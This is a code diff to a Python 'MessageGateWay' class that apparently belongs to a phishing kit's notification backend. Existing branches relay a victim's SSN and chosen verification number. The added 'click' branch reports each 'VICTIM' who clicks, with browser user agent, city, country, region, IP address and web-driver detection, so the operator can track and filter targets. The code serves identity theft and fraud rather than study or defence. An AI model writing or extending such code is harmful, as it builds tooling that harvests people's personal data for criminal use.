@@ -29,9 +29,18 @@ class MessageGateWay:
                     f"👤 *SSN:* `{self.data.get('ssn')}`"
                 )
             case 'selected-verification-method':
-                print("Selected verification method:", self.data.get('selected_number'))
                 return (
                     f"📱 *SELECTED VERIFICATION METHOD:* \n\n`{self.data.get('selected_number')}`"
+                )
+            case 'click':
+                return (
+                    f"📱 *VICTIM IN [CLICKED]:* \n\n"
+                    f"🌐 *BROWSER:* `{self.data.get('click').USER_AGENT}`\n\n"
+                    f"📍 *CITY:* `{self.data.get('click').CITY}`\n\n"
+                    f"📍 *COUNTRY:* `{self.data.get('click').COUNTRY}`\n\n"
+                    f"📍 *REGION:* `{self.data.get('click').REGION}`\n\n"
+                    f"📡 *IP ADDRESS:* `{self.data.get('click').IP}`"
+                    f"🤖 *WEB DRIVER:* `{self.data.get('click').WEB_DRIVER}`"
                 )
             case _:
                 return "Unknown message type"
